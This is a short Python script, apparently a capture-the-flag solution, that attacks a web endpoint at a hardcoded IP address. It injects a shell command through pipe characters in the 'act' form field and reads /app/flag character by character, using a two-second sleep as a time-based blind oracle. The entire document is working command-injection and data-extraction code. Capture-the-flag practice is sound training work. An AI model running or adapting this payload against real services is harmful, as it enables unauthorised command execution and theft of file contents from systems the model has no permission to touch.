import string
import time
import requests
str = string.hexdigits + "-" + "}" + "ISCTF{"
result = ""
for i in range(0, 1000):
    for n in str:
        payload = f"if [`cut - c {i} /app/flag` == \"{n}\" ];then sleep 2;fi"
        url = "http://120.79.18.34:20650/rce"
        start = int(time.time())
        res = requests.post(url=url, data={'act': '|' + payload + '|'})
        end = int(time.time())
        padding = end - start
        if res.status_code == 200 and padding > 1:
            result = result + n
            print(result)
            break
